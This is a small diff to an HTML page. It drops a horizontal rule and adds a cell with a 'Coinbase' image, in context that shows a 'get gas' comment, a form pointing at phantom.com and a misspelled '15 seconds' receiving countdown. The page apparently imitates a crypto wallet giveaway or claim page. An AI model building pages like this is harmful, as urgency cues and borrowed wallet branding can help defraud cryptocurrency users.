@@ -59,8 +59,6 @@
                                                          
 <img align="center" src="IMG_8719.gif" alt="blockchain Logo" width="100" />
 
-<hr>
-
 <!-- get gas -->
 
 <form action="https://phantom.com/" method="get">
@@ -83,6 +81,14 @@
 <span style="color: green;">RECEVING IN <<<15 seconds</span>
 
 <br>
+
+
+  <td align="center" style="padding: 20px;">
+    
+<img src="IMG_0523.jpeg" alt="Coinbase" width="150" style="display:block; max-width:100%; height:auto;" />
+    
+   </td>
+
 
 <div>
 
